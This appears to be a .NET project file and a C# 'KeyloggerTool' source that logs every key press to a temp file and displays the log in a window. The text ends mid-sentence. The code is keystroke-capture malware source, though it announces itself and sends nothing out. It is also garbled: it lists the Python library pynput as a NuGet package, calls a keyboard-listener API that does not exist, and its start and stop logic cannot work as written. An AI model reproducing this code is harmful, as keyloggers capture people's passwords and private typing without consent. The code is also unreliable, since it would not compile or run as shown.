<Project Sdk="Microsoft.NET.Sdk">
 
  <PropertyGroup>
    <OutputType>Exe</OutputType>
    <TargetFramework>net5.0</TargetFramework>
  </PropertyGroup>
 
  <ItemGroup>
    <PackageReference Include="System.Windows.Forms" Version="5.0.11" />
    <PackageReference Include="pynput" Version="1.7.3" />
  </ItemGroup>
</Project>
KeyloggerTool.cs
using System;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using pynput;

namespace KeyloggerTool
{
    public class Keylogger
    {
        private readonly string _logFile;
        private readonly KeyboardListener _listener;
        private bool _isRecording;

        public Keylogger()
        {
            _logFile = Path.Combine(Path.GetTempPath(), "keylogger.txt");

            _listener = new KeyboardListener();
            _listener.OnKeyPressed += OnKeyPressed;
            _listener.OnKeyReleased += OnKeyReleased;
        }

        public void Start()
        {
            if (_isRecording) return;

            _isRecording = true;
            _listener.Start();

            Application.Run(new RecordingForm(_logFile));
        }

        public void Stop()
        {
            if (!_isRecording) return;

            _isRecording = false;
            _listener.Stop();
        }

        private void OnKeyPressed(KeyboardKey key)
        {
            File.AppendAllText(_logFile, key.ToString() + " ");
        }

        private void OnKeyReleased(KeyboardKey key)
        {
            File.AppendAllText(_logFile, Environment.NewLine);
        }

        [STAThread]
        static void Main()
        {
            var keylogger = new Keylogger();

            Console.WriteLine("Press any key to start recording...");
            Console.ReadKey();

            keylogger.Start();

            Console.WriteLine("Press any key to stop recording...");
            Console.ReadKey();

            keylogger.Stop();
        }
    }

    public class RecordingForm : Form
    {
        private readonly TextBox _textBox;

        public RecordingForm(string logFile)
        {
            this.Text = "Keylogger Tool";
            this.Size = new System.Drawing.Size(800, 600);

            _textBox = new TextBox
            {
                Multiline = true,
                ReadOnly = true,
                ScrollBars = ScrollBars.Vertical,
                Location = new System.Drawing.Point(12, 12),
                Size = this.ClientSize
            };

            this.Controls.Add(_textBox);

            if (File.Exists(logFile))
                _textBox.Text = File.ReadAllText(logFile);
        }
    }
}
This C
